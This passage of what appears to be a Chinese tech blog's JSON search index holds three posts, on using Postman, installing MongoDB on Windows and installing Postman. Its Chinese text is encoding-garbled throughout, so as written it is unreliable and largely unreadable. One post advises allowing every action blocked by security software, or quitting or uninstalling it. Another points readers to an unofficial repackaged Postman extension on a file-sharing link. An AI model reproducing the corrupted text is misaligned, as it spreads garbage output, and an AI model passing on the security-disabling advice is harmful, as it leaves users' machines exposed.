è®¾ç½®ç¯å¢ƒå˜é‡ä¸€èˆ¬æµ‹è¯•ç¯å¢ƒã€å¼€å‘ç¯å¢ƒã€çº¿ä¸Šç¯å¢ƒçš„ç¯å¢ƒæ˜¯ç‹¬ç«‹å¼€æ¥çš„ï¼Œè®¾ç½®å¥½ç¯å¢ƒå˜é‡ä»¥åï¼Œæ¥å£åœ°å€ç¨åšè°ƒæ•´ï¼Œè¯·æ±‚çš„æ—¶å€™é€‰æ‹©å¯¹åº”çš„ç¯å¢ƒå°±èƒ½å¾ˆæ–¹ä¾¿çš„åˆ‡æ¢åˆ°ä¸åŒçš„ç¯å¢ƒæ¥æµ‹è¯•ã€‚ 1.ç‚¹å‡»ä¸‹å›¾ä¸­æ‰€ç¤ºçš„å°é½¿è½®æŒ‰é’®ï¼Œç„¶åç‚¹å‡»Manage Enviroments 2.åœ¨Manage Enviromentsæ ä¸‹ç‚¹å‡»Add 3.ç¼–è¾‘ç¯å¢ƒçš„åç§°ä»¥åŠæ¥å£åç§°å’ŒIPç«¯å£ï¼Œç‚¹å‡»Updateä¿å­˜ 4.ä¿®æ”¹è¯·æ±‚urlè¿”å›åˆ°postmanä¸»é¡µé¢ï¼Œå°†æ¥å£å‰é¢çš„IPå’Œç«¯å£æ¢æˆåˆšåˆšè®¾ç½®å¥½çš„ç¯å¢ƒçš„keyï¼Œå†™åœ¨ä¸¤å¯¹å¤§æ‹¬å·é‡Œé¢ï¼Œå¯ä»¥çœ‹åˆ°å­—ä½“è‡ªåŠ¨å˜æˆäº†æ©™è‰²ï¼Œé¼ æ ‡æ”¾åˆ°ä¸Šé¢èƒ½çœ‹åˆ°è¿™ä¸ªkeyæ‰€å¯¹åº”çš„valueï¼Œä¹Ÿå°±æ˜¯IPå’Œç«¯å£ã€‚ç„¶ååœ¨ç¯å¢ƒä¸‹æ‹‰æ¡†é€‰æ‹©æƒ³è¦æµ‹è¯•çš„ç¯å¢ƒï¼Œæˆ‘è¿™é‡Œé€‰æ‹©çš„æ˜¯ç¼–è¾‘å¥½çš„æµ‹è¯•ç¯å¢ƒï¼Œè¿™ä¸ªæ—¶å€™è¯·æ±‚å°±ä¼šåœ¨æµ‹è¯•ç¯å¢ƒè¯·æ±‚äº†ï¼Œæƒ³è¦åœ¨çº¿ä¸Šæµ‹è¯•çš„è¯ï¼Œå°±åœ¨ç¯å¢ƒä¸‹æ‹‰æ¡†é€‰æ‹©ç¼–è¾‘å¥½çš„çº¿ä¸Šç¯å¢ƒå°±å¥½äº†ã€‚ ä¿å­˜åˆ°æ¥å£é›†åˆå¤§éƒ¨åˆ†æƒ…å†µä¸‹ï¼Œä¸€ä¸ªç³»ç»Ÿæ¨¡å—æœ‰å¾ˆå¤šä¸ªæ¥å£ï¼ŒæŠŠè¯·æ±‚éƒ½æ”¾åœ¨è¯¥æ¨¡å—çš„ä¸€ä¸ªé›†åˆä¸‹æ–¹ä¾¿ç®¡ç†ã€‚ 1.å·¦ä¾§åˆ‡æ¢åˆ°collectionsæ ï¼Œç‚¹å‡»æ·»åŠ æŒ‰é’® 2.å¡«å†™é›†åˆåç§°å’Œé›†åˆæè¿°å¹¶ä¿å­˜ 3.ç‚¹å‡»è¯·æ±‚å³ä¾§çš„saveæŒ‰é’®ï¼Œç‚¹å‡»save as 4.å¼¹çª—å†…å¡«å†™è¯·æ±‚çš„åç§°å’Œæè¿°ç­‰ï¼Œä¸‹æ–¹é€‰æ‹©ç‚¹å‡»åˆšåˆšåˆ›å»ºçš„é›†åˆå¹¶ä¿å­˜ æ‰¹é‡æ‰§è¡Œè¯·æ±‚postmanè‡ªå¸¦çš„runnerå¯ä»¥æ‰¹é‡æ‰§è¡Œä¸€ä¸ªé›†åˆçš„æ¥å£ç”¨ä¾‹ 1.ç‚¹å‡»ä¸»é¡µå·¦ä¸Šæ–¹çš„Runner 2.é€‰æ‹©é›†åˆ é€‰æ‹©ç‚¹å‡»åˆšåˆšåˆ›å»ºçš„test111é›†åˆ Environmentå‹¾é€‰éœ€è¦æµ‹è¯•çš„ç¯å¢ƒ Iterationæ˜¯æ‰§è¡Œæµ‹è¯•ï¼Œè¿™é‡Œå°±æ‰§è¡Œä¸€æ¬¡å°±å¥½ ç‚¹å‡»Start Runå°±å¼€å§‹æ‰§è¡Œï¼Œå³ä¾§èƒ½çœ‹åˆ°è¯·æ±‚ç»“æœï¼Œæœ€ä¸Šæ–¹æ˜¯æ±‡æ€» å¯¼å‡ºä¸å¯¼å…¥postmanèƒ½å¾ˆæ–¹ä¾¿çš„å°†æ¥å£æµ‹è¯•é›†åˆå¯¼å‡ºåˆ°æœ¬åœ°ï¼ŒåŒæ ·çš„ä¹Ÿèƒ½ä»æœ¬åœ°å¯¼å…¥è¿›æ¥ã€‚ å¯¼å‡ºcollectionä¸ç¯å¢ƒå˜é‡1.ç‚¹å‡»è¯·æ±‚é›†åˆå³ä¾§çš„ä¸‰ä¸ªç‚¹ -&gt; Export 2.å¼¹çª—ç‚¹å‡»Exportè¿™é‡Œæœ‰collection v1å’Œcollection v2ä¸¤ç§æ¨¡å¼ï¼Œv2æ¨¡å¼å¯¼å‡ºçš„ä¸œè¥¿æ›´å¤šï¼Œä¸€èˆ¬é€‰æ‹©v1å°±å¯ä»¥äº†ã€‚ 3.åœ¨ç¯å¢ƒå˜é‡è®¾ç½®è¿™é‡Œé€‰æ‹©è¦å¯¼å‡ºçš„ç¯å¢ƒï¼Œç‚¹å‡»å³ä¾§å‘ä¸‹ç®­å¤´å³å¯å°†ç¯å¢ƒä¿å­˜åˆ°æœ¬åœ°ã€‚ 4.å¯¼å‡ºåˆ°æœ¬åœ°çš„è¯·æ±‚é›†åˆå’Œç¯å¢ƒéƒ½æ˜¯jsonæ ¼å¼çš„æ–‡ä»¶ å¯¼å…¥Collectionç›´æ¥ç‚¹å‡»postmanå·¦ä¸Šæ–¹çš„ImportæŒ‰é’®ï¼Œåœ¨æœ¬åœ°é€‰æ‹©collectionå³å¯ æ³¨å†Œç™»é™†ä¸ç™»å½•å¹¶ä¸ä¼šå½±å“å·¥å…·çš„ä½¿ç”¨ï¼Œä½†æ˜¯ç™»é™†ä»¥åæ¥å£æµ‹è¯•ç”¨ä¾‹éƒ½å¯ä»¥ä¿å­˜åˆ°è´¦å·é‡Œé¢ï¼Œä¸ç®¡æ˜¯åœ¨é‚£ä¸ªç”µè„‘ä¸Šç™»é™†è‡ªå·±çš„è´¦å·å°±éƒ½èƒ½çœ‹åˆ°å·²ç»ä¿å­˜çš„æ¥å£æµ‹è¯•é›†åˆï¼Œæ‰€ä»¥è¿˜æ˜¯æ¨èç™»é™†è´¦å·ä½¿ç”¨ï¼Œè°·æ­Œé‚®ç®±å¯ä»¥ç›´æ¥ç™»é™†ï¼Œæ”¯æŒå›½å†…çš„QQé‚®ç®±ç­‰æ³¨å†Œç™»é™†ã€‚ ç›¸å…³æ–‡ç« postmanå®‰è£…ä»¥åŠé—®é¢˜postmanæ¥å£ç”¨ä¾‹æ‰¹é‡æ‰§è¡Œ(Newman)å®šæ—¶ä»»åŠ¡ä¸Pythonå‘é€é‚®ä»¶xx","categories":[{"name":"æµ‹è¯•","slug":"æµ‹è¯•","permalink":"http://yoursite.com/categories/%E6%B5%8B%E8%AF%95/"}],"tags":[{"name":"æ¥å£æµ‹è¯•","slug":"æ¥å£æµ‹è¯•","permalink":"http://yoursite.com/tags/%E6%8E%A5%E5%8F%A3%E6%B5%8B%E8%AF%95/"},{"name":"å·¥å…·ä½¿ç”¨","slug":"å·¥å…·ä½¿ç”¨","permalink":"http://yoursite.com/tags/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/"},{"name":"postman","slug":"postman","permalink":"http://yoursite.com/tags/postman/"}]},{"title":"mongodbå®‰è£…åŠå¯èƒ½å‡ºç°çš„é—®é¢˜","slug":"mongodbå®‰è£…","date":"2017-08-14T17:03:00.000Z","updated":"2018-12-17T02:30:56.668Z","comments":true,"path":"2017/08/15/mongodbå®‰è£…/","link":"","permalink":"http://yoursite.com/2017/08/15/mongodb%E5%AE%89%E8%A3%85/","excerpt":"","text":"ç›®å½• ä¸‹è½½mongodb é…ç½® å¯åŠ¨mongodb è¿›å…¥mongodb æ³¨å†Œä¸ºWindowsæœåŠ¡ å¯èƒ½å‡ºç°çš„é—®é¢˜ ä¸€ã€ä¸‹è½½mongodbè¿›å…¥å®˜ç½‘ï¼Œé€‰æ‹©é€‚åˆçš„ç‰ˆæœ¬å¹¶ä¸‹è½½åˆ°æœ¬åœ°ï¼Œä¸åŒæ“ä½œç³»ç»Ÿï¼Œ32ä½64ä½éƒ½æœ‰å¯¹åº”çš„å®‰è£…åŒ…ï¼Œæ¯”å¦‚æˆ‘ä¸‹è½½çš„æ˜¯msiæ ¼å¼çš„å®‰è£…ç¨‹åºï¼Œä¸‹è½½åç›´æ¥åŒå‡»è¿è¡Œå®‰è£…ï¼Œæˆ‘å®‰è£…çš„è·¯å¾„æ˜¯ D:\\application\\mongodbã€‚ äºŒã€é…ç½®1.åœ¨D:\\application\\mongodbè·¯å¾„ä¸‹æ–°å»ºä¸€ä¸ªDataç›®å½• 2.ç»§ç»­è¿›å…¥Dataç›®å½•åˆ›å»ºä¸€ä¸ªdbç›®å½•ï¼Œä¸€ä¸ªlogç›®å½• 3.ç»§ç»­è¿›å…¥logç›®å½•æ–°å»ºä¸€ä¸ªMongoDB.logçš„æ–‡ä»¶ ä¸‰ã€å¯åŠ¨mongodbç”¨ç®¡ç†å‘˜èº«ä»½å¯åŠ¨cmdï¼Œcdè¿›å…¥D:\\application\\mongodb\\binï¼Œè¾“å…¥ï¼š 1mongod.exe -dbpath &quot;D:\\application\\mongodb\\Data\\db&quot; ä½œç”¨ï¼šå°†mongodbçš„æ•°æ®åº“æ–‡ä»¶åˆ›å»ºåˆ°D:\\application\\mongodb\\Data\\dbç›®å½•æ³¨æ„ï¼š1ã€æ³¨æ„æ˜¯mongod.exeï¼Œä¸æ˜¯mongo.exeï¼Œä¸è¦ææ··äº†ã€‚2ã€æ­¤æ—¶ç•Œé¢æœ€åä¸€è¡Œä¼šæ˜¾ç¤ºwaiting for connections on port 27017åˆ™è¡¨ç¤ºæ•°æ®åº“å·²ç»å¯åŠ¨æˆåŠŸã€‚ å››ã€è¿›å…¥mongodbä»ç„¶æ˜¯åœ¨binç›®å½•ä¸‹ï¼Œæ–°å»ºä¸€ä¸ªcmdçª—å£ï¼Œè¿è¡Œmongo.exeï¼ˆæ³¨æ„è·Ÿmongod.exeåŒºåˆ†å¼€ï¼‰å°±è¿›å…¥äº†mongodbäº¤äº’ç•Œé¢ã€‚ äº”ã€æ³¨å†Œä¸ºWindowsæœåŠ¡1.ç”¨ç®¡ç†å‘˜èº«ä»½ï¼ˆå¿…é¡»æ˜¯ç®¡ç†å‘˜ï¼‰å¯åŠ¨cmdï¼Œè¿›å…¥D:\\application\\mongodb\\binï¼Œ2.è¾“å…¥ï¼š 1mongod.exe -dbpath &quot;D:\\application\\mongodb\\Data\\db&quot; -logpath &quot;D:\\application\\mongodb\\Data\\log\\MongoDB.log&quot; -install -serviceName &quot;MongoDB&quot; æ­¤æ—¶æœåŠ¡å°±å·²ç»å®‰è£…æˆåŠŸã€‚è¿è¡Œnet start mongodb(å¼€å¯æœåŠ¡) ç›¸åº”çš„net stop mongodb(å…³é—­æœåŠ¡) å…­ã€å¯èƒ½é‡åˆ°çš„é—®é¢˜1.æ“ä½œè¢«æ‹¦æˆªæ“ä½œè¢«æ‹¦æˆªåœ¨æ“ä½œè¿‡ç¨‹ä¸­ç”µè„‘ç®¡å®¶ï¼Œå®‰å…¨å«å£«ç­‰è½¯ä»¶ä¼šæ‹¦æˆªæ“ä½œï¼Œä¸€å¾‹å…è®¸ï¼Œæˆ–è€…æ“ä½œä¹‹å‰å…ˆæŠŠè¿™äº›è½¯ä»¶å®Œå…¨é€€å‡ºï¼ˆå…¶å®å¯ä»¥ç›´æ¥å¸è½½æ‰è¿™äº›ç”¨å¤„ä¸æ˜¯å¾ˆå¤§çš„è½¯ä»¶ï¼‰ã€‚ 2.æœåŠ¡æ³¨å†Œå¤±è´¥æœåŠ¡æ³¨å†Œå¤±è´¥ï¼ŒæŸ¥çœ‹åœ¨D:\\application\\mongodb\\Data\\log\\MongoDB.logé‡Œé¢è®°å½•çš„ä¿¡æ¯ä¸ºâ€œError connecting to the Service Control Manager: æ‹’ç»è®¿é—®â€è¿™ç§æƒ…å†µå°±æ˜¯å› ä¸ºcmdä¸æ˜¯é€šè¿‡ç®¡ç†å‘˜æ–¹å¼å¯åŠ¨çš„ï¼Œæ²¡æœ‰æƒé™é€ æˆçš„ï¼Œæ‰€ä»¥ä¸ºäº†ä»¥é˜²ä¸‡ä¸€ï¼Œä¸Šé¢æ‰€æœ‰çš„cmdæ“ä½œéƒ½ç”¨ç®¡ç†å‘˜æ–¹å¼æ‰“å¼€ã€‚ 3.æœåŠ¡å¯åŠ¨å¤±è´¥æœåŠ¡æ³¨å†Œå®Œæˆåï¼Œè¿è¡Œå‘½ä»¤net start mongodbå¯åŠ¨æœåŠ¡å¯èƒ½ä¼šå¤±è´¥ï¼Œè¿™ä¸ªæ—¶å€™å»åˆ æ‰dbç›®å½•ä¸‹è¿™ä¸¤ä¸ªæ–‡ä»¶å†é‡æ–°å¯åŠ¨æœåŠ¡å°±å¥½äº†D:\\application\\mongodb\\Data\\dbmongod.lockstorage.bsonxx","categories":[{"name":"Webå¼€å‘","slug":"Webå¼€å‘","permalink":"http://yoursite.com/categories/Web%E5%BC%80%E5%8F%91/"}],"tags":[{"name":"å·¥å…·","slug":"å·¥å…·","permalink":"http://yoursite.com/tags/%E5%B7%A5%E5%85%B7/"},{"name":"æ•°æ®åº“","slug":"æ•°æ®åº“","permalink":"http://yoursite.com/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/"},{"name":"mongodb","slug":"mongodb","permalink":"http://yoursite.com/tags/mongodb/"}]},{"title":"postmanå®‰è£…ä»¥åŠé—®é¢˜","slug":"postman","date":"2017-08-07T04:30:00.000Z","updated":"2018-12-17T02:30:56.712Z","comments":true,"path":"2017/08/07/postman/","link":"","permalink":"http://yoursite.com/2017/08/07/postman/","excerpt":"","text":"ç›®å½• ä¸€ã€nativeç‰ˆï¼ˆæ¨èï¼‰ äºŒã€chromeç‰ˆåœ¨çº¿å®‰è£…ï¼ˆå®˜æ–¹ä¸å†æ›´æ–°ç»´æŠ¤ï¼‰ ä¸‰ã€chromeç‰ˆæœ¬åœ°å®‰è£… ä¸€ã€nativeç‰ˆè¿™ä¸ªç‰ˆæœ¬æ˜¯ç›´æ¥ä¸‹è½½å®‰è£…åŒ…åœ¨æœ¬åœ°å®‰è£…å³å¯ï¼Œæœ‰Windowsï¼ŒMacOSï¼ŒLinuxç‰ˆæœ¬ã€‚è¿›å…¥å®˜ç½‘åœ°å€ï¼Œè¿™é‡Œæˆ‘é€‰æ‹©Windowsç‰ˆæœ¬64ä½ï¼Œä¸‹è½½åˆ°æœ¬åœ°æ­£å¸¸å®‰è£…æ‰“å¼€å³å¯ï¼Œå¯åŠ¨åè½¯ä»¶ä¸Šæ–¹æœ‰èœå•æ ï¼Œè¿™ä¹Ÿæ˜¯nativeç‰ˆä¸chromeç‰ˆæœ¬çš„åŒºåˆ«ä¹‹ä¸€ã€‚ äºŒã€chromeç‰ˆåœ¨çº¿å®‰è£…å¦‚æœå¯ä»¥ç§‘å­¦ä¸Šç½‘çš„è¯ï¼Œæœ€æ–¹ä¾¿çš„å°±æ˜¯ç›´æ¥åœ¨è°·æ­Œæµè§ˆå™¨åº”ç”¨å•†åº—æœç´¢postmanï¼Œå®‰è£…è¿™ä¸¤ä¸ªæ’ä»¶å³å¯ã€‚ç„¶ååœ¨åº”ç”¨é‡Œé¢å°±å¯ä»¥æ‰¾åˆ°postman,å³é”®postmanå›¾æ ‡ï¼Œç‚¹å‡»â€œåˆ›å»ºå¿«æ·æ–¹å¼â€å¯ä»¥åœ¨æ¡Œé¢åˆ›å»ºpostmanå›¾æ ‡ã€‚ ä¸‰ã€chromeç‰ˆæœ¬åœ°å®‰è£…å¤§éƒ¨åˆ†chromeæµè§ˆå™¨æ’ä»¶éƒ½å¯ä»¥åˆ©ç”¨ç›´æ¥æ‹–æ‹½.crxæ’ä»¶åˆ°æµè§ˆå™¨çš„æ–¹å¼å®‰è£…ï¼Œä½†æ˜¯æœ‰äº›æ’ä»¶æ¯”è¾ƒç‰¹æ®Šä¸èƒ½è¿™æ ·å®‰è£…æˆåŠŸï¼Œpostmanå°±æ˜¯å…¶ä¸­ä¹‹ä¸€ã€‚ 1.å®‰è£…postmanä¸‹è½½å·²ç»æ‰“åŒ…å¥½çš„postmanæ’ä»¶ï¼Œæ³¨æ„æ˜¯.zipçš„å‹ç¼©åŒ…ï¼Œä¸æ˜¯.crxæ ¼å¼çš„æ–‡ä»¶ã€‚ï¼ˆæˆ‘å·²ç»æ‰“åŒ…å¥½æœ€æ–°çš„5.1.3ç‰ˆæœ¬æ”¾åœ¨ç™¾åº¦äº‘ï¼Œé“¾æ¥: https://pan.baidu.com/s/1kVQMrL9 å¯†ç : r5rnï¼‰ä¸‹è½½å®Œæˆåè§£å‹è¯¥æ–‡ä»¶ï¼Œç„¶åæŠŠå…¶ä¸­â€œ_metadataâ€æ–‡ä»¶å¤¹çš„åç§°ä¿®æ”¹ä¸ºâ€œmetadataâ€ï¼Œä¹Ÿå°±æ˜¯å»æ‰å‰é¢çš„å°æ¨ªçº¿ï¼Œä¸ä¿®æ”¹çš„è¯å¯èƒ½ä¼šæŠ¥é”™ï¼ˆæ³¨ï¼šæ’ä»¶å®‰è£…ä»¥åè¿™ä¸ªæ–‡ä»¶å¤¹ä¸èƒ½åˆ é™¤ï¼Œå»ºè®®æ”¾åœ¨ä¸ç»å¸¸å˜åŠ¨çš„åœ°æ–¹ï¼‰ã€‚ åœ¨æµè§ˆå™¨è®¾ç½®é‡Œæ‰“å¼€â€œæ‰©å±•ç¨‹åºâ€ï¼Œæˆ–è€…ç›´æ¥åœ¨åœ°å€æ è¾“å…¥â€œchrome://extensions/â€è¿›å…¥æ‰©å±•ç¨‹åºé¡µé¢ã€‚â‘  åœ¨å¼€å‘è€…æ¨¡å¼å‰é¢æ‰“ä¸Šå‹¾â‘¡ ç‚¹å‡»åŠ è½½å·²è§£å‹çš„æ‰©å±•ç¨‹åºâ‘¢ é€‰æ‹©åˆšåˆšè§£å‹å‡ºæ¥çš„æ–‡ä»¶å¤¹åç‚¹å‡»ç¡®å®šå°±èƒ½å®‰è£…æˆåŠŸ 2.å®‰è£…Postman Interceptoræ’ä»¶å®‰è£…è¿™ä¸ªæ’ä»¶å¯ä»¥ç›´æ¥ä»ç”µè„‘é‡Œæ‹–åˆ°æµè§ˆå™¨æ‰©å±•ç¨‹åºé¡µé¢å®‰è£… ç›¸å…³æ–‡ç« postmanç®€å•ä½¿ç”¨postmanæ¥å£ç”¨ä¾‹æ‰¹é‡æ‰§è¡Œ(Newman)å®šæ—¶ä»»åŠ¡ä¸Pythonå‘é€é‚®ä»¶xx","categories":[{"name":"æµ‹è¯•","slug":"æµ‹è¯•","permalink":"http://yoursite.com/categories/%E6%B5%8B%E8%AF%95/"}],"tags":[{"name":"æ¥å£æµ‹è¯•","slug":"æ¥å£æµ‹è¯•","permalink":"http://yoursite.com/tags/%E6%8E%A5%E5%8F%A3%E6%B5%8B%E8%AF%95/"},{"name":"å·¥å…·","slug":"å·¥å…·","permalink":"http://yoursite.com/tags/%E5%B7%A5%E5%85%B7/"},{"name":"postman","slug":"postman","permalink":"http://yoursite.com/tags/postman/"}]}],"categories":[{"name":"å®‰å…¨","slug":"å®‰å…¨","permalink":"http://yoursite.com/categories/%E5%AE%89%E5%85%A8/"},{"name":"çˆ¬è™«","slug":"çˆ¬è™«","permalink":"http://yoursite.com/categories/%E7%88%AC%E8%99%AB/"},{"name":"æµ‹è¯•","slug":"æµ‹è¯•","permalink":"http://yoursite.com/categories/%E6%B5%8B%E8%AF%95/"},{"name":"è‡ªåŠ¨åŒ–","slug":"è‡ªåŠ¨åŒ–","permalink":"http://yoursite.com/categories/%E8%87%AA%E5%8A%A8%E5%8C%96/"},{"name":"Webå¼€å‘","slug":"Webå¼€å‘","permalink":"http://yoursite.com/categories/Web%E5%BC%80%E5%8F%91/"}],"tags":[{"name":"æ¸—é€","slug":"æ¸—é€","permalink":"http://yoursite.com/tags/%E6%B8%97%E9%80%8F/"},{"name":"å®‰å…¨","slug":"å®‰å…¨","permalink":"http://yoursite.com/tags/%E5%AE%89%E5%85%A8/"},{"name":"æƒé™ç»´æŒ","slug":"æƒé™ç»´æŒ","permalink":"http://yoursite.com/tags/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/"},{"name":"python","slug":"python","permalink":"http://yoursite.com/tags/python/"},{"name":"ç«¯å£","slug":"ç«¯å£","permalink":"http://yoursite.com/tags/%E7%AB%AF%E5%8F%A3/"},{"name":"æ‰«æå™¨","slug":"æ‰«æå™¨","permalink":"http://yoursite.com/tags/%E6%89%AB%E6%8F%8F%E5%99%A8/"},{"name":"è‡ªåŠ¨åŒ–","slug":"è‡ªåŠ¨åŒ–","permalink":"http://yoursite.com/tags/%E8%87%AA%E5%8A%A8%E5%8C%96/"},{"name":"kali","slug":"kali","permalink":"http://yoursite.com/tags/kali/"},{"name":"çˆ¬è™«","slug":"çˆ¬è™«","permalink":"http://yoursite.com/tags/%E7%88%AC%E8%99%AB/"},{"name":"å¤šçº¿ç¨‹","slug":"å¤šçº¿ç¨‹","permalink":"http://yoursite.com/tags/%E5%A4%9A%E7%BA%BF%E7%A8%8B/"},{"name":"kali linux","slug":"kali-linux","permalink":"http://yoursite.com/tags/kali-linux/"},{"name":"æ¸—é€æµ‹è¯•","slug":"æ¸—é€æµ‹è¯•","permalink":"http://yoursite.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"name":"appium","slug":"appium","permalink":"http://yoursite.com/tags/appium/"},{"name":"selenium","slug":"selenium","permalink":"http://yoursite.com/tags/selenium/"},{"name":"django","slug":"django","permalink":"http://yoursite.com/tags/django/"},{"name":"mysql","slug":"mysql","permalink":"http://yoursite.com/tags/mysql/"},{"name":"cmd","slug":"cmd","permalink":"http://yoursite.com/tags/cmd/"},{"name":"UIè‡ªåŠ¨åŒ–","slug":"UIè‡ªåŠ¨åŒ–","permalink":"http://yoursite.com/tags/UI%E8%87%AA%E5%8A%A8%E5%8C%96/"},{"name":"éªŒè¯ç ","slug":"éªŒè¯ç ","permalink":"http://yoursite.com/tags/%E9%AA%8C%E8%AF%81%E7%A0%81/"},{"name":"linux","slug":"linux","permalink":"http://yoursite.com/tags/linux/"},{"name":"requests","slug":"requests","permalink":"http://yoursite.com/tags/requests/"},{"name":"APP","slug":"APP","permalink":"http://yoursite.com/tags/APP/"},{"name":"STF","slug":"STF","permalink":"http://yoursite.com/tags/STF/"},{"name":"æ¥å£æµ‹è¯•","slug":"æ¥å£æµ‹è¯•","permalink":"http://yoursite.com/tags/%E6%8E%A5%E5%8F%A3%E6%B5%8B%E8%AF%95/"},{"name":"log","slug":"log","permalink":"http://yoursite.com/tags/log/"},{"name":"unittest","slug":"unittest","permalink":"http://yoursite.com/tags/unittest/"},{"name":"excel","slug":"excel","permalink":"http://yoursite.com/tags/excel/"},{"name":"Windows","slug":"Windows","permalink":"http://yoursite.com/tags/Windows/"},{"name":"semantic UI","slug":"semantic-UI","permalink":"http://yoursite.com/tags/semantic-UI/"},{"name":"html","slug":"html","permalink":"http://yoursite.com/tags/html/"},{"name":"css","slug":"css","permalink":"http://yoursite.com/tags/css/"},{"name":"ç³»ç»Ÿå‘½ä»¤","slug":"ç³»ç»Ÿå‘½ä»¤","permalink":"http://yoursite.com/tags/%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4/"},{"name":"æ€§èƒ½æµ‹è¯•","slug":"æ€§èƒ½æµ‹è¯•","permalink":"http://yoursite.com/tags/%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95/"},{"name":"locust","slug":"locust","permalink":"http://yoursite.com/tags/locust/"},{"name":"æŒç»­é›†æˆ","slug":"æŒç»­é›†æˆ","permalink":"http://yoursite.com/tags/%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90/"},{"name":"Jenkins","slug":"Jenkins","permalink":"http://yoursite.com/tags/Jenkins/"},{"name":"é‚®ä»¶","slug":"é‚®ä»¶","permalink":"http://yoursite.com/tags/%E9%82%AE%E4%BB%B6/"},{"name":"å·¥å…·ä½¿ç”¨","slug":"å·¥å…·ä½¿ç”¨","permalink":"http://yoursite.com/tags/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/"},{"name":"postman","slug":"postman","permalink":"http://yoursite.com/tags/postman/"},{"name":"newman","slug":"newman","permalink":"http://yoursite.com/tags/newman/"},{"name":"å·¥å…·","slug":"å·¥å…·","permalink":"http://yoursite.com/tags/%E5%B7%A5%E5%85%B7/"},{"name":"æ•°æ®åº“","slug":"æ•°æ®åº“","permalink":"http://yoursite.com/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/"},{"name":"mongodb","slug":"mongodb","permalink":"http://yoursite.com/tags/mongodb/"}]}